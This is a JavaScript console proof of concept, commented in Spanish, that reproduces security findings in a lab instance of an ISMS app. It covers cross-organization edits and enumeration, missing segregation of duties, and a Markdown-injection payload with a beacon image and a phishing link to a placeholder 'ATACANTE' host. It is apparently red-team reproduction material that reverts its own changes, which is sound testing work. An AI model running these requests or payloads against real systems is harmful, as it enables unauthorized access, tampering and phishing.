/* ============================================================================
 * sistema-rsi — PoC de consola (TEMPORAL, para copiar/pegar en DevTools)
 * ----------------------------------------------------------------------------
 * Uso: logueate en la app como dueno@rsi.local, abrí F12 -> Console, pegá TODO
 * este archivo una vez, y después llamá a las funciones: h1(), h9(), h10()...
 * Cada cambio de prueba se revierte dentro de la propia función.
 * Archivo temporal de apoyo a docs/05-reproduccion.md — se puede borrar luego.
 * ========================================================================== */

const API = location.origin + '/api/v1';
async function api(metodo, ruta, cuerpo) {
  const r = await fetch(API + ruta, {
    method: metodo, credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: cuerpo ? JSON.stringify(cuerpo) : undefined,
  });
  const t = await r.text();
  let body; try { body = JSON.parse(t); } catch { body = t; }
  console.log(`%c${metodo} ${ruta} -> ${r.status}`, 'font-weight:bold', body);
  return { status: r.status, body };
}
async function apiJson(metodo, ruta, cuerpo) { return (await api(metodo, ruta, cuerpo)).body; }

/* IDs del laboratorio (org "Logística del Ceibo", cuenta dueno@rsi.local) */
const miOrg       = 'f257cf8e-49ad-4afe-a9d0-9c096ec3ed5c'; // tu organización
const unidadAjena = '064fd1a9-a3e8-431d-a616-140fb0c90fe9'; // Tecnología y seguridad (NO es tu unidad)
const orgAjena    = 'e0be2b28-4af0-49a9-85fd-e1eaedc738ae'; // Constructora del Plata (otra organización)

/* ---- H1: editar unidad/organización fuera del alcance propio ---- */
async function h1() {
  console.group('H1 — control de acceso roto');
  await api('GET',   `/organizaciones/unidades/${unidadAjena}`);                 // 200 (leer unidad ajena)
  await api('PATCH', `/organizaciones/unidades/${unidadAjena}`, { nombre: '[PRUEBA-RT]' }); // 200 (editarla)
  await api('PATCH', `/organizaciones/unidades/${unidadAjena}`, { nombre: 'Tecnología y seguridad' }); // revertir
  await api('PATCH', `/organizaciones/${orgAjena}`, { alcanceSgsi: '[PRUEBA-RT]' });        // 200 (org ajena)
  await api('PATCH', `/organizaciones/${orgAjena}`, { alcanceSgsi: null });                 // revertir
  console.groupEnd();
}

/* ---- H9: el listado de organizaciones no filtra por membresía ---- */
async function h9() {
  console.group('H9 — enumeración cross-org');
  const orgs = await apiJson('GET', '/organizaciones');
  console.table(orgs.map(o => ({ id: o.id, nombre: o.nombre })));
  const me = await apiJson('GET', '/auth/me');
  console.log(`Ves ${orgs.length} orgs, pero sos miembro de UNA: ${me.organizacionId}`);
  console.groupEnd();
}

/* ---- H10: crear un proceso "huérfano" sin organización ---- */
async function h10() {
  console.group('H10 — proceso sin alcance');
  const { body } = await api('POST', '/organizaciones/procesos', { nombre: '[PRUEBA-RT] huerfano' });
  console.log('organizacionId =', body.organizacionId, '(esperado null)');
  if (body.id) await api('DELETE', `/organizaciones/procesos/${body.id}`); // limpiar
  console.groupEnd();
}

/* ---- H11: auto-aprobar/aceptar un riesgo propio ---- */
async function h11() {
  console.group('H11 — falta de segregación de funciones');
  const mios = await apiJson('GET', '/seguridad/riesgos');
  const r = mios[0];
  if (!r) { console.warn('no hay riesgos propios para probar'); console.groupEnd(); return; }
  const estadoOrig = r.estado;
  await api('PATCH', `/seguridad/riesgos/${r.id}`, { estado: 'APROBADA', aceptado: true }); // 200
  await api('GET',   `/seguridad/riesgos/${r.id}`);
  await api('PATCH', `/seguridad/riesgos/${r.id}`, { estado: estadoOrig, aceptado: false }); // revertir
  console.groupEnd();
}

/* ---- RT-03: Markdown injection en el exportador ---- */
async function rt03() {
  console.group('RT-03 — Markdown injection');
  const { body } = await api('POST', `/cumplimiento/politicas/${miOrg}`, {
    titulo: '[PRUEBA-RT] md', estado: 'BORRADOR', version: '1.0',
    descripcion: 'beacon ![x](https://ATACANTE/b.png) y [link](https://ATACANTE/phish)',
  });
  const exp = await apiJson('GET', `/exportaciones/organizaciones/${miOrg}/politica-seguridad`);
  const txt = typeof exp === 'string' ? exp : JSON.stringify(exp);
  console.log('¿payload sin escapar en el export?', txt.includes('ATACANTE/b.png') ? 'SÍ (vulnerable)' : 'no');
  if (body.id) await api('DELETE', `/cumplimiento/politicas/${body.id}`); // limpiar
  console.groupEnd();
}

/* ---- Controles que SÍ funcionan (deben dar 403) ---- */
async function negativos() {
  console.group('Controles correctos (esperado 403)');
  await api('GET', `/organizaciones/${orgAjena}/unidades`); // unidades de otra org -> 403 (sí scopeado)
  const me = await apiJson('GET', '/auth/me');
  await api('PATCH', `/auth/usuarios/${me.id}`, { rol: 'ADMINISTRADOR' }); // auto-promoción -> 403
  console.groupEnd();
}

/* Ejecutar todas las de dueno de corrido: */
async function todas() { await h9(); await h1(); await h10(); await h11(); await rt03(); await negativos(); }

console.log('%cPoC cargado. Llamá: h1() h9() h10() h11() rt03() negativos()  —  o todas()', 'color:#38b28c;font-weight:bold');
/* Nota: H2/H2b (activo ajeno), H2c (hito cross-org), H3 (admin), H2d (RSI), H4/H4b
 * requieren datos sembrados o sesiones con MFA — ver docs/05-reproduccion.md. */
